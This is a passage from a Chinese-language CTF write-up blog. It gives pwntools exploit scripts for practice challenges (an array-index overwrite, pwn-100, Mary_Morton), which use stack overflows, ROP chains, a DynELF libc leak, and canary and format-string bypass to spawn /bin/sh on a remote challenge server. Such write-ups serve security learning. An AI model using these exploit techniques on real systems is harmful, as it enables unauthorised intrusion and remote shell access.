class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs lsl">from pwn import *<br>context.log_level=&#x27;debug&#x27;<br>p=remote(&#x27;<span class="hljs-number">111.198</span><span class="hljs-number">.29</span><span class="hljs-number">.45</span>&#x27;,<span class="hljs-number">42691</span>)<br>p.recvuntil(<span class="hljs-string">&quot;have:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(&#x27;<span class="hljs-number">1</span>&#x27;)<br>p.recvuntil(<span class="hljs-string">&quot;numbers<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;115<span class="hljs-subst">\n</span>&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;exit<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;3&quot;</span>+<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;change:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;132&quot;</span>+<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;number:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;180&quot;</span>+<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;exit<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;3&quot;</span>+<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;change:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;133&quot;</span>+<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;number:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;133&quot;</span>+<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;exit<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;3<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;change:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;134&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;number:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;exit<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;3<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;change:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;135&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;number:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;8&quot;</span>)<br>#<span class="hljs-number">0x080485b4</span>   <span class="hljs-number">080485</span>B4                 call    _system<br>p.recvuntil(<span class="hljs-string">&quot;exit<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;3&quot;</span>+<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;change:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;136&quot;</span>+<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;number:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(&#x27;<span class="hljs-number">135</span>&#x27;)<br><br>p.recvuntil(<span class="hljs-string">&quot;exit<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;3&quot;</span>+<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;change:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;137&quot;</span>+<span class="hljs-string">&quot;<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;number:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(&#x27;<span class="hljs-number">137</span>&#x27;)<br><br>p.recvuntil(<span class="hljs-string">&quot;exit<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;3<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;change:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;138&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;number:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(&#x27;<span class="hljs-number">4</span>&#x27;)<br><br>p.recvuntil(<span class="hljs-string">&quot;exit<span class="hljs-subst">\n</span>&quot;</span>)<br>p.send(<span class="hljs-string">&quot;3<span class="hljs-subst">\n</span>&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;change:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;139&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;number:<span class="hljs-subst">\n</span>&quot;</span>)<br>p.sendline(&#x27;<span class="hljs-number">8</span>&#x27;)<br>&#x27;&#x27;&#x27;<br>#<span class="hljs-number">0x08048987</span><br><span class="hljs-number">08048980</span>  <span class="hljs-number">2</span>F <span class="hljs-number">62</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>E <span class="hljs-number">2</span>F <span class="hljs-number">62</span> <span class="hljs-number">61</span> <span class="hljs-number">73</span>  <span class="hljs-number">68</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">2</span>A <span class="hljs-number">2</span>A <span class="hljs-number">2</span>A <span class="hljs-number">2</span>A  /bin/bash...****<br>&#x27;&#x27;&#x27;<br>p.recvuntil(<span class="hljs-string">&quot;exit<span class="hljs-subst">\n</span>&quot;</span>)<br>#gdb.<span class="hljs-section">attach</span>(p,<span class="hljs-string">&quot;b *0x80488ee&quot;</span>)<br>p.send(<span class="hljs-string">&quot;5<span class="hljs-subst">\n</span>&quot;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn-100"><a href="#pwn-100" class="headerlink" title="pwn-100"></a>pwn-100</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br>   <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>   <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>   <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>   <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure><p>➤ ROPgadget –binary pwn-100  –only ‘pop|ret’ | grep ‘rdi’<br>0x0000000000400763 : pop rdi ; ret</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_40068E</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-40h]</span><br><br>  <span class="hljs-built_in">sub_40063D</span>((__int64)&amp;v1, <span class="hljs-number">200</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;bye~&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">int64 __fastcall <span class="hljs-title">sub_40063D</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> a2)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    result = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)i;<br>    <span class="hljs-keyword">if</span> ( i &gt;= a2 )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, (<span class="hljs-keyword">void</span> *)(i + a1), <span class="hljs-number">1uLL</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h4><p>puts()函数用来向标准输出设备（屏幕）输出字符串并换行，具体为：把字符串输出到标准输出设备，将’\0’转换为回车换行。其调用方式为，puts(s)；其中s为字符串字符（字符串数组名或字符串指针）。 puts输出字符串时要遇到’\0’也就是字符结束符才停止 。</p><p>int puts(const char *string);</p><p>puts()函数的一种实现方案如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">puts</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> * string)</span>　</span><br><span class="hljs-function"></span>&#123;　<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> * t = string;　<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> * v = string;　<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;　<br>    <span class="hljs-keyword">while</span>(*t!=<span class="hljs-string">&#x27;\0&#x27;</span>)　<br>    &#123;　<br>        i++;　<br>        t++;　<br>    &#125;　<br>    <span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;　<br>    <span class="hljs-keyword">for</span>(j;j&lt;=i;j++)　<br>        <span class="hljs-built_in">putchar</span>((v[j]));　<br>    <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;　<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> count)</span></span>;<br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">write</span>() writes up <span class="hljs-built_in">to</span> count <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> buffer starting <span class="hljs-keyword">at</span> buf <span class="hljs-built_in">to</span><br><span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> referred <span class="hljs-built_in">to</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> descriptor fd.<br></code></pre></td></tr></table></figure><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">On</span> success, the number <span class="hljs-keyword">of</span> bytes written <span class="hljs-built_in">is</span> returned.  <span class="hljs-keyword">On</span> <span class="hljs-keyword">error</span>, -<span class="hljs-number">1</span> <span class="hljs-built_in">is</span><br>returned, <span class="hljs-built_in">and</span> errno <span class="hljs-built_in">is</span> <span class="hljs-keyword">set</span> <span class="hljs-keyword">to</span> indicate the cause <span class="hljs-keyword">of</span> the <span class="hljs-keyword">error</span>.<br></code></pre></td></tr></table></figure><p>此题较基础，需要注意的点就是x64函数的传参，</p><p>linux下常见的就是gcc编译环境，传参方式如：void function( rdi, rsi, rdx, rcx, r8, r9 ,…(on stack))</p><p>另外知道write,puts,gets,read等函数的特点有助于解题</p><p>思路：</p><p>靠 DynELF 模块泄露libc基址，在rw段写入”/bin/sh”,然后system(“/bin/sh”)。</p><p>这里贴上 Tangerine 的exp</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta">#!/usr/bin/python</span><br><span class="hljs-meta">#coding:utf-8</span><br>from pwn import *<br>io = remote(<span class="hljs-string">&quot;111.198.29.45&quot;</span>, <span class="hljs-number">40321</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn100&quot;</span>)<br>puts_addr = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>start_addr = <span class="hljs-number">0x400550</span><br>pop_rdi = <span class="hljs-number">0x400763</span><br>pop6_addr = <span class="hljs-number">0x40075a</span>   <span class="hljs-meta">#万能gadget1：pop rbx<span class="hljs-comment">; pop rbp; pop r12; pop r13; pop r14; pop r15; retn</span></span><br>mov_call_addr = <span class="hljs-number">0x400740</span><span class="hljs-meta">#万能gadget2：mov rdx, r13<span class="hljs-comment">; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]</span></span><br><br>binsh_addr = <span class="hljs-number">0x60107c</span><span class="hljs-meta">#bss放了STDIN和STDOUT的FILE结构体，修改会导致程序崩溃，所以找了个固定的可写地址</span><br><br><br><br>def leak(addr):<br>count = <span class="hljs-number">0</span><br>up = <span class="hljs-string">&#x27;&#x27;</span><br>content = <span class="hljs-string">&#x27;&#x27;</span><br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">72</span><span class="hljs-meta">#padding</span><br>payload += p64(pop_rdi)<span class="hljs-meta">#给puts()赋值</span><br>payload += p64(addr)<span class="hljs-meta">#leak函数的参数addr</span><br>payload += p64(puts_addr)<span class="hljs-meta">#调用puts()函数</span><br>payload += p64(start_addr)<span class="hljs-meta">#跳转到start，恢复栈</span><br>payload = payload.ljust(<span class="hljs-number">200</span>, <span class="hljs-string">&#x27;B&#x27;</span>)<span class="hljs-meta">#padding</span><br>io.<span class="hljs-built_in">send</span>(payload)<br>io.recvuntil(<span class="hljs-string">&quot;bye~\n&quot;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<span class="hljs-meta">#无限循环读取，防止recv()读取输出不全</span><br>c = io.recv(numb=<span class="hljs-number">1</span>, timeout=<span class="hljs-number">0.1</span>)<span class="hljs-meta">#每次读取一个字节，设置超时时间确保没有遗漏</span><br>count += <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> up == <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-literal">and</span> c == <span class="hljs-string">&quot;&quot;</span>: <span class="hljs-meta">#上一个字符是回车且读不到其他字符，说明读完了</span><br>content = content[:<span class="hljs-number">-1</span>]+<span class="hljs-string">&#x27;\x00&#x27;</span><span class="hljs-meta">#最后一个字符置为\x00</span><br><span class="hljs-built_in">break</span><br><span class="hljs-keyword">else</span>:<br>content += c<span class="hljs-meta">#拼接输出</span><br>up = c<span class="hljs-meta">#保存最后一个字符</span><br>content = content[:<span class="hljs-number">4</span>]<span class="hljs-meta">#截取输出的一段作为返回值，提供给DynELF处理</span><br><span class="hljs-built_in">log</span>.info(<span class="hljs-string">&quot;%#x =&gt; %s&quot;</span> % (addr, (content <span class="hljs-literal">or</span> <span class="hljs-string">&#x27;&#x27;</span>).encode(<span class="hljs-string">&#x27;hex&#x27;</span>)))<br><span class="hljs-keyword">return</span> content<br><br>d = DynELF(leak, elf = elf)<br>system_addr = d.lookup(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;libc&#x27;</span>)<br><span class="hljs-built_in">log</span>.info(<span class="hljs-string">&quot;system_addr = %#x&quot;</span>, system_addr)<br>payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">72</span><span class="hljs-meta">#padding</span><br>payload += p64(pop6_addr)<span class="hljs-meta">#万能gadget1</span><br>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-meta">#rbx = 0</span><br>payload += p64(<span class="hljs-number">1</span>)<span class="hljs-meta">#rbp = 1，过掉后面万能gadget2的call返回后的判断</span><br>payload += p64(read_got)<span class="hljs-meta">#r12 = got表中read函数项，里面是read函数的真正地址，直接通过万能gadget2的call qword ptr [r12+rbx*8]调用</span><br>payload += p64(<span class="hljs-number">8</span>)<span class="hljs-meta">#r13 = 8，read函数读取的字节数，万能gadget2赋值给rdx</span><br>payload += p64(binsh_addr)<span class="hljs-meta">#r14 = read函数读取/bin/sh保存的地址，万能gadget2赋值给rsi</span><br>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-meta">#r15 = 0，read函数的参数fd，即STDIN，万能gadget2赋值给edi</span><br>payload += p64(mov_call_addr)<span class="hljs-meta">#万能gadget2</span><br>payload += <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">56</span><span class="hljs-meta">#万能gadget2后接判断语句，过掉之后是万能gadget1，用于填充栈</span><br>payload += p64(start_addr)<span class="hljs-meta">#跳转到start，恢复栈</span><br><span class="hljs-meta">#payload = payload.ljust(200, <span class="hljs-string">&quot;B&quot;</span>)#padding</span><br>io.<span class="hljs-built_in">send</span>(payload)<br>io.recvuntil(<span class="hljs-string">&#x27;bye~\n&#x27;</span>)<br>io.<span class="hljs-built_in">send</span>(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<span class="hljs-meta">#上面的一段payload调用了read函数读取<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>，这里发送字符串</span><br><br>payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">72</span><span class="hljs-meta">#padding</span><br>payload += p64(pop_rdi)<span class="hljs-meta">#给system函数传参</span><br>payload += p64(binsh_addr)<span class="hljs-meta">#rdi = &amp;(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)</span><br>payload += p64(system_addr)<span class="hljs-meta">#调用system函数执行system(<span class="hljs-string">&quot;/bin/sh&quot;</span>)</span><br>payload = payload.ljust(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;B&quot;</span>)<span class="hljs-meta">#padding</span><br>io.<span class="hljs-built_in">send</span>(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h2><p>这道题涉及到了canary</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br>  <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>  <span class="hljs-attr">Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br>  <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>  <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure><p>提供了system</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-number">000004008</span>DA <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004008</span>DA                 <span class="hljs-keyword">push</span>    rbp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004008</span>DB                 <span class="hljs-keyword">mov</span>     rbp, rsp<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004008</span>DE                 <span class="hljs-keyword">mov</span>     edi, offset command <span class="hljs-comment">; &quot;/bin/cat ./flag&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004008E3</span>                 <span class="hljs-keyword">call</span>    _system<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004008E8</span>                 <span class="hljs-keyword">nop</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004008E9</span>                 <span class="hljs-keyword">pop</span>     rbp<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_4009DA</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. Stack Bufferoverflow Bug &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. Format String Bug &quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. Exit the battle &quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 <span class="hljs-title">sub_4008EB</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-90h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+88h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">memset</span>(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>uLL);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x7F</span>uLL);<br>  <span class="hljs-built_in">printf</span>(&amp;buf, &amp;buf);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 <span class="hljs-title">sub_4008EB</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-90h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+88h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u); <span class="hljs-comment">//canary</span><br>  <span class="hljs-built_in">memset</span>(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>uLL);<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x7F</span>uLL);<br>  <span class="hljs-built_in">printf</span>(&amp;buf, &amp;buf);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;  <span class="hljs-comment">//canary</span><br>&#125;<br></code></pre></td></tr></table></figure><p>先了解一波CANARY，原文： <a href="https://www.jianshu.com/p/c3624f5dd583">https://www.jianshu.com/p/c3624f5dd583</a> </p><p>Canary保护机制的原理，是在一个函数入口处从fs段内获取一个随机值，一般存到EBP - 0x4(32位)或RBP - 0x8(64位)的位置。如果攻击者利用栈溢出修改到了这个值，导致该值与存入的值不一致，__stack_chk_fail函数将抛出异常并退出程序。Canary最高字节一般是\x00，防止由于其他漏洞产生的Canary泄露</p><blockquote><p> <code>需要注意的是：canary一般最高位是\x00，64位程序的canary大小是8个字节，32位的是4个字节，canary的位置不一定就是与ebp存储的位置相邻，具体得看程序的汇编操作</code></p></blockquote><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><h3 id="泄漏canary："><a href="#泄漏canary：" class="headerlink" title="泄漏canary："></a>泄漏canary：</h3><p>这个操作大概分两种：</p><ul><li>1.先通过覆盖Canary最后一个”\x00″字节，来防止0截断，进而通过printf等函数打印出4/8位的Canary，又或者通过格式化字符串泄漏输出canary，之后，计算好偏移，将Canary填入到相应的溢出位置，实现为所欲为的栈溢出</li><li>SSP leak，这个是反向思维的操作，通过Canary的报错输出来泄露内存,如下面源代码所示。libcargv[0]应用程序的参数，在Canary出错报错输出中会打印出应用程序的路径，这正是__libc_argv[0]的内容，如果栈溢出到能够覆盖__libc_argv[0]，那么Canary就会报错打印相应的指针内容</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;debug/fortify_fail.c&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">__attribute__</span> <span class="hljs-params">((noreturn)</span>)</span><br><span class="hljs-function"><span class="hljs-title">__fortify_fail</span> <span class="hljs-params">(msg)</span></span><br><span class="hljs-function"> <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *msg</span>;<br>&#123;<br> <span class="hljs-comment">/* The loop is added only to keep gcc happy. */</span><br> <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br> __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br> msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br>libc_hidden_def (__fortify_fail)<br></code></pre></td></tr></table></figure><h3 id="0x02"><a href="#0x02" class="headerlink" 